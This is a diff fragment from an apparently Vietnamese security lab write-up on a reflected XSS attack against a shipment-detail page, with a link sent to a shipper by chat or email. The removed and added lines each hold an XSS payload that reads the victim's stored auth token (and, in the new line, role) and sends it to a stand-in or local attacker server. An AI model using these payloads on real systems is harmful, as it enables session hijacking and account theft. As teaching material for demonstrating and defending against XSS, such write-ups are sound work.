@@ -307,7 +307,8 @@ python attacker_server.py
 
 Bước 2 — Craft URL độc hại và gửi cho shipper (qua Zalo, SMS, email nội bộ):
 ```
-https://localhost:8443/shipment-detail.jsp?id=%27;fetch(%27https://attacker.example.com/steal?t=%27+localStorage.getItem(%27auth_token%27))//
+https://localhost:8443/shipment-detail.jsp?id=%27%3B(function()%7Bvar%20t%3DlocalStorage.getItem(%27auth_token%27)%7C%7C%27%27%3Bvar%20r%3DlocalStorage.getItem(%27auth_role%27)%7C%7C%27%27%3Bfetch(%27http%3A%2F%2Flocalhost%3A9999%2Fsteal%3Ft%3D%27%2BencodeURIComponent(t)%2B%27%26r%3D%27%2BencodeURIComponent(r))%3B%7D)()%2F%2F
+
 ```
 
 Nội dung giả mạo kèm link:
